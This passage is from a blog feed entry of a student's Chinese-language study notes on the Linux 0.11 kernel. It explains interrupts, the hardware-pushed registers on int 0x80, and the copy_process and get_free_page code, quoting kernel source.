class=&#34;line&#34;&gt;	:::&lt;span class=&#34;string&#34;&gt;&amp;quot;ax&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;17-在Linux操作系统中大量使用了中断、异常类的处理，究竟有什么好处？&#34;&gt;&lt;a href=&#34;#17-在Linux操作系统中大量使用了中断、异常类的处理，究竟有什么好处？&#34; class=&#34;headerlink&#34; title=&#34;17.在Linux操作系统中大量使用了中断、异常类的处理，究竟有什么好处？&#34;&gt;&lt;/a&gt;17.在Linux操作系统中大量使用了中断、异常类的处理，究竟有什么好处？&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;    在此之前是采用“主动轮巡”的方式来处理这些请求,在轮巡的时候干不了别的,很浪费时间. 所以不如采用被动的模式,即当有需要的时候,发送中断信号,告诉CPU进入到具体的中断处理程序进行处理. 这样使得CPU的处理更加高效.
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;18-copy-process函数的参数最后五项是：long-eip-long-cs-long-eflags-long-esp-long-ss。查看栈结构确实有这五个参数，奇怪的是其他参数的压栈代码都能找得到，确找不到这五个参数的压栈代码，反汇编代码中也查不到，请解释原因。&#34;&gt;&lt;a href=&#34;#18-copy-process函数的参数最后五项是：long-eip-long-cs-long-eflags-long-esp-long-ss。查看栈结构确实有这五个参数，奇怪的是其他参数的压栈代码都能找得到，确找不到这五个参数的压栈代码，反汇编代码中也查不到，请解释原因。&#34; class=&#34;headerlink&#34; title=&#34;18.copy_process函数的参数最后五项是：long eip,long cs,long eflags,long esp,long ss。查看栈结构确实有这五个参数，奇怪的是其他参数的压栈代码都能找得到，确找不到这五个参数的压栈代码，反汇编代码中也查不到，请解释原因。&#34;&gt;&lt;/a&gt;18.copy_process函数的参数最后五项是：long eip,long cs,long eflags,long esp,long ss。查看栈结构确实有这五个参数，奇怪的是其他参数的压栈代码都能找得到，确找不到这五个参数的压栈代码，反汇编代码中也查不到，请解释原因。&lt;/h1&gt;&lt;p&gt;p83&lt;/p&gt;
&lt;p&gt;是在int 0x80的时候,CPU硬件自动将ss、esp、eflags、cs、eip进行压栈(压入进程0的内核栈), (本意是保护存储压栈现场,使得中断返回后能够继续正常执行,在这里我们灵活取用了)&lt;/p&gt;
&lt;p&gt;init&amp;#x2F;main.c &lt;/p&gt;
&lt;h1 id=&#34;19-分析get-free-page-函数的代码，叙述在主内存中获取一个空闲页的技术路线。&#34;&gt;&lt;a href=&#34;#19-分析get-free-page-函数的代码，叙述在主内存中获取一个空闲页的技术路线。&#34; class=&#34;headerlink&#34; title=&#34;19.分析get_free_page()函数的代码，叙述在主内存中获取一个空闲页的技术路线。&#34;&gt;&lt;/a&gt;19.分析get_free_page()函数的代码，叙述在主内存中获取一个空闲页的技术路线。&lt;/h1&gt;&lt;p&gt;p89&lt;/p&gt;
&lt;p&gt;赵炯p446&lt;/p&gt;
&lt;p&gt;kernel&amp;#x2F;fork.c&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;copy_process&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; nr,&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; ebp,&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; edi,&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; esi,&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; gs,&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; none, &lt;span class=&#34;comment&#34;&gt;//none是&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;		&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; ebx,&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; ecx,&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; edx,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;		&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; fs,&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; es,&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; ds,&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;params&#34;&gt;		&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; eip,&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; cs,&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; eflags,&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; esp,&lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; ss)&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;//int 0x80 ss esp啥呀这是&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123; &lt;span class=&#34;comment&#34;&gt;//参数哪来的呢?? 传参了吗? 压栈放在栈里了, 主调函数往里放 在哪传的?&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;task_struct&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;p&lt;/span&gt;;&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;file&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;f&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p = (&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; task_struct *) get_free_page(); &lt;span class=&#34;comment&#34;&gt;//返回的指针做强制类型转换,把一块空间转换成一个struct&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!p)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;mm&amp;#x2F;memory.c&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * Get physical address of first (actually last :-) free page, and mark it&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; * used. If no free pages left, return 0.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;get_free_page&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;register&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; __res &lt;span class=&#34;title function_&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;ax&amp;quot;&lt;/span&gt;)&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__asm__(&lt;span class=&#34;string&#34;&gt;&amp;quot;std ; repne ; scasb\n\t&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;jne 1f\n\t&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;movb $1,1(%%edi)\n\t&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;sall $12,%%ecx\n\t&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;addl %2,%%ecx\n\t&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;movl %%ecx,%%edx\n\t&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;movl $1024,%%ecx\n\t&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;leal 4092(%%edx),%%edi\n\t&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;rep ; stosl\n\t&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;movl %%edx,%%eax\n&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;1:&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	:&lt;span class=&#34;string&#34;&gt;&amp;quot;=a&amp;quot;&lt;/span&gt; (__res)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	:&lt;span class=&#34;string&#34;&gt;&amp;quot;0&amp;quot;&lt;/span&gt; (&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;),&lt;span class=&#34;string&#34;&gt;&amp;quot;i&amp;quot;&lt;/span&gt; (LOW_MEM),&lt;span class=&#34;string&#34;&gt;&amp;quot;c&amp;quot;&lt;/span&gt; (PAGING_PAGES),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;D&amp;quot;&lt;/span&gt; (mem_map+PAGING_PAGES&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	:&lt;span class=&#34;string&#34;&gt;&amp;quot;di&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;cx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;dx&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; __res;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&#34;20-分析copy-page-tables（）函数的代码，叙述父进程如何为子进程复制页表。&#34;&gt;&lt;a href=&#34;#20-分析copy-page-tables（）函数的代码，叙述父进程如何为子进程复制页表。&#34; class=&#34;headerlink&#34; title=&#34;20.分析copy_page_tables（）函数的代码，叙述父进程如何为子进程复制页表。&#34;&gt;&lt;/a&gt;20.分析copy_page_tables（）函数的代码，叙述父进程如何为子进程复制页表。&lt;/h1&gt;&lt;p&gt;p97&lt;/p&gt;
&lt;h1 id=&#34;参考资料&#34;&gt;&lt;a href=&#34;#参考资料&#34; class=&#34;headerlink&#34; title=&#34;参考资料&#34;&gt;&lt;/a&gt;参考资料&lt;/h1&gt;&lt;p&gt;《Linux内核设计的艺术 第二版》 新设计团队&lt;/p&gt;
&lt;p&gt;《Linux内核完全注释》 赵炯&lt;/p&gt;
&lt;p&gt;《IA32》 手册 第三卷&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.likecs.com/show-204742912.html&#34;&gt;https://www.likecs.com/show-204742912.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/sunym1993/flash-linux0.11-talk&#34;&gt;https://github.com/sunym1993/flash-linux0.11-talk&lt;/a&gt;&lt;/p&gt;
</content>
        <category term="研究生课程" />
        <updated>2022-11-13T10:20:59.000Z</updated>
    </entry>
</feed>
